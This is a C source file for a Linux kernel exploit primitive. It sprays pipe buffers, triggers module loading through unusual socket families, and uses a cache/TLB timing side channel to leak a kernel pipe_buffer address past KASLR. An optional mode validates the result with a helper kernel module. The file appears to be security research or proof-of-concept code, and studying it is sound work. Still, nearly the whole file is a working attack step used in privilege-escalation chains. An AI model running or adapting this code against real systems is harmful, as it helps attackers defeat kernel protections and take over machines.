#define _GNU_SOURCE
#include <sys/socket.h>

#define VALIDATE
#ifdef VALIDATE
#include "lkm_utils.c"
#endif
#include "pipe_utils.c"
#include "prefetch.c"
#include "tlbflush.c"
#include "utils.c"

#define IPPROTO_DCCP   33
#define IPPROTO_SCTP   132
#define IPPROTO_L2TP   115
#define CAN_RAW	       1
#define CAN_BCM	       2
#define CAN_ISOTP      6

#define OBJS_PER_SLAB  42
#define SPRAY	       (OBJS_PER_SLAB * 100)
#define PIPES	       (OBJS_PER_SLAB * 10)

#define DPM_LEAK_TRIES 40

int spray[SPRAY][2];
int pipes[PIPES][2];

int
main(void)
{
	printf("[*] starting pipe buffer leak\n");
	set_limit();
	pin_to_core(0);
	init_tlb_flush();
	size_t mem_total = get_total_memory();

	// pipe buffer spray part 1
	for (size_t i = 0; i < SPRAY / 2; i++) {
		timed_alloc_primitive(spray[i]);
	}

	// load kernel modules
	int sock_fd = socket(AF_INET, SOCK_DCCP, IPPROTO_DCCP);
	if (sock_fd < 0) {
		error("socket(AF_INET,SOCK_DCCP, IPPROTO_DCCP)");
	}
	sock_fd = socket(SOCK_DGRAM, CAN_BCM, 0);
	if (sock_fd < 0) {
		error("socket(SOCK_DGRAM, CAN_BCM, 0)");
	}
	sock_fd = socket(AF_VSOCK, SOCK_STREAM, 0);
	if (sock_fd < 0) {
		error("socket(AF_VSOCK, SOCK_STREAM, 0)");
	}
	sock_fd = socket(AF_CAN, SOCK_DGRAM, CAN_ISOTP);
	if (sock_fd < 0) {
		error("socket(AF_CAN, SOCK_DGRAM, CAN_ISOTP)");
	}
	sock_fd = socket(PF_INET, SOCK_STREAM, IPPROTO_SCTP);
	if (sock_fd < 0) {
		error("socket(PF_INET, SOCK_STREAM, IPPROTO_SCTP)");
	}
	sock_fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_L2TP);
	if (sock_fd < 0) {
		error("socket(PF_INET, SOCK_DGRAM, IPPROTO_L2TP)");
	}

	// pipe buffer spray part 2
	size_t time;
	size_t time_prev = -1;
	size_t last_slab = -1;
	int found = 0;
	for (size_t i = SPRAY / 2; i < SPRAY; i++) {
		time = timed_alloc_primitive(spray[i]);

		if (time > (time_prev + 1000)) {
			if (last_slab == (size_t)-1) {
				last_slab = i;
			} else if (i - last_slab == OBJS_PER_SLAB) {
				// found 2 full slabs
				found = 1;
				break;
			} else {
				last_slab = -1;
			}
		}

		time_prev = time;
	}

	if (!found) {
		printf(
		    "[!] reached end of spray without detecting two full slabs\n");
	}

	// allocation primitive
	for (size_t i = 0; i < PIPES; i++) {
		timed_alloc_primitive(pipes[i]);
	}

	size_t dpm_base = dpm_leak(DPM_LEAK_TRIES);

	size_t found_address;
	size_t n_found = 0;

	for (size_t addr = dpm_base; addr < dpm_base + mem_total;
	    addr += (1 << 21)) {
		if (is_2mb(pipes[0][0], addr)) {
			continue;
		}

		for (size_t i = 0; i < (1ULL << 21); i += (1ULL << 12)) {
			size_t cur_addr = addr + i;

			size_t found_0 = hit_flush(pipes[0][0], cur_addr);
			if (!found_0) {
				continue;
			}

			size_t found_ns1 = hit_flush(pipes[OBJS_PER_SLAB][0],
			    cur_addr);
			if (found_ns1) {
				continue;
			}

			size_t found_ns2 =
			    hit_flush(pipes[OBJS_PER_SLAB * 2][0], cur_addr);
			if (found_ns2) {
				continue;
			}
			size_t found_ns3 =
			    hit_flush(pipes[OBJS_PER_SLAB * 3][0], cur_addr);
			if (found_ns3) {
				continue;
			}

			size_t found_ns4 =
			    hit_flush(pipes[OBJS_PER_SLAB * 4][0], cur_addr);
			if (found_ns4)
				continue;

			size_t found_ns5 =
			    hit_flush(pipes[OBJS_PER_SLAB * 5][0], cur_addr);
			if (found_ns5) {
				continue;
			}

			size_t found_1 = hit_flush(pipes[1][0], cur_addr);
			if (!found_1) {
				continue;
			}

			size_t found_2 = hit_flush(pipes[2][0], cur_addr);
			if (!found_2) {
				continue;
			}

			size_t found_3 = hit_flush(pipes[3][0], cur_addr);
			if (!found_3) {
				continue;
			}

			size_t found_21 = hit_flush(pipes[21][0], cur_addr);
			if (!found_21) {
				continue;
			}

			size_t found_40 = hit_flush(pipes[40][0], cur_addr);
			if (!found_40) {
				continue;
			}

			size_t found_39 = hit_flush(pipes[39][0], cur_addr);
			if (!found_39) {
				continue;
			}

			n_found += 1;
			if (n_found > 1) {
				break;
			}

			found_address = cur_addr;
		}
		if (n_found > 1) {
			break;
		}
	}

	if (n_found == 0) {
		printf("[!] no address found\n");
		return 2;
	} else if (n_found != 1) {
		printf("[!] multiple addresses found\n");
		return 3;
	}
#ifdef VALIDATE
	lkm_open();

	for (size_t i = 0; i < PIPES; i += 1) {
		size_t real_pipe_buffer = lkm_pipe_buffer_leak(pipes[i][0]);
		if (real_pipe_buffer == found_address) {
			printf("[+] found address matches allocation %lu\n", i);
			return 0;
		}
	}

	printf("[!] found %lx (different from real found with lkm)\n",
	    found_address);
	return 1;
#else
	printf("[+] found %lx\n", found_address);
	return 0;
#endif
}
